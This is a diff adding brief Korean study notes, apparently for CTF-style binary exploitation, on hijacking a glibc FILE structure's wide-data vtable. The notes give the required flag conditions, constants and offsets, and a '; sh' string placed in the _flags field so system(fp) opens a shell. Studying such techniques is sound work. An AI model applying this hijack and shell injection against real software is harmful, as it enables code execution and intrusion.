@@ -1,0 +1,23 @@
+f->_flags & _IO_NO_WRITES == 0
+f->_flags & _IO_CURRENTLY_PUTTING == 0
+f->_wide_data->_IO_write_base == 0
+fp->_wide_data->_IO_buf_base == 0
+fp->_flags & _IO_UNBUFFERED == 0
+fp->_wide_data->_wide_vtable->__doallocate == <임의 코드 주소>
+fp->vtable == <_IO_wfile_overflow() 오프셋에 해당하는 것을 실행하기 위한 vtable 값>
+
+[상수]
+_IO_NO_WRITES = 0x0008
+_IO_CURRENTLY_PUTTING = 0x0800
+_IO_UNBUFFERED = 0x0002
+
+[오프셋]
+_wide_data offset = 0xa0
+_wide_vtable offset = 0xe0
+__doallocate offset = 0x68
+
+fp가 첫 인자로 들어가기 때문에(RDI), 앞 fp 맨 앞 _flags가 인식됨
+따라서 fp는 유효한 녀석이면서, system(fp)가 정상 작동하게 할 수 있어야함
+_flags에는 b'\x01' * 4, 그리고 뒤를 '; sh\x00'으로 맞춤.
+끝을 알리기 위해 당연히 널바이트 뒤에 붙인 거고, 앞 플래그 바이트는 정상 명령어가 아니기 때문에 세미콜론으로 끊음
+
